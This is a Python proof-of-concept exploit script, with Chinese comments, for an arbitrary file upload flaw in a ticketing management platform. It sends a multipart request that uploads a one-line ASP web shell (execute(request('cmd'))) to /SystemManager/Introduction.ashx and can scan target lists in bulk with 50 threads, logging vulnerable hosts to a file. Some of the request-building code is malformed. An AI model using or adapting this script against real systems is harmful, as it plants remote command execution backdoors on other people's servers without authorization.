import argparse
from multiprocessing.dummy import Pool
import requests
import sys,re
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'

#定义横幅


def banner():
    banner = """

 ██░ ██  ▄▄▄       ██▀███  ▓█████▄  ▒█████    ▄████ 
▓██░ ██▒▒████▄    ▓██ ▒ ██▒▒██▀ ██▌▒██▒  ██▒ ██▒ ▀█▒
▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒░██   █▌▒██░  ██▒▒██░▄▄▄░
░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ░▓█▄   ▌▒██   ██░░▓█  ██▓
░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒░▒████▓ ░ ████▓▒░░▒▓███▀▒
 ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒▓  ▒ ░ ▒░▒░▒░  ░▒   ▒ 
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ▒  ▒   ░ ▒ ▒░   ░   ░ 
 ░  ░░ ░  ░   ▒     ░░   ░  ░ ░  ░ ░ ░ ░ ▒  ░ ░   ░ 
 ░  ░  ░      ░  ░   ░        ░        ░ ░        ░ 
                            ░                       
                                       
                            version:1.1.0
                            author:Hardog  
"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="中城科信票务管理平台 任意文件上传")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = '/SystemManager/Introduction.ashx'
    url = target+payload
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36',
        'Connection':'close',
        'Content-Length':'476',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Content-Type':'multipart/form-data; boundary=--------------------------354575237365372692397370',
        'Accept-Encoding':'gzip',
    }
    data = {
        '----------------------------354575237365372692397370\r\n'
        'Content-Disposition:form-data; name="file"; filename="5.txt"\r\n'
        'Content-Type:image/jpeg\r\n'
        '\r\n'
        '<%execute(request("cmd"))%>\r\n'
        '\r\n'
        '----------------------------354575237365372692397370\r\n'
        'Content-Disposition:form-data; name="fileName"\r\n'
        '\r\n'
        'test_20240504.asp\r\n'
        '----------------------------354575237365372692397370\r\n'
        'Content-Disposition':'form-data; name="Method"\r\n'
        '\r\n'
        'UpdateUploadLinkPic\r\n'
        '----------------------------354575237365372692397370\r\n'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    #请求网页
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,proxies=proxies,timeout=8)
        if res.status_code == 200:
            print(f'[+]{GREEN}该网站存在文件上传漏洞{target}\n{RESET}')
            with open('result.txt',mode='a',encoding='utf-8')as fp:
                fp.write(target+'\n')
                return True 
        else:
            print(f'该网站不存在文件上传漏洞')
    except:
        print(f'该网站存在问题，请手动测试')


if __name__ == '__main__':
    main()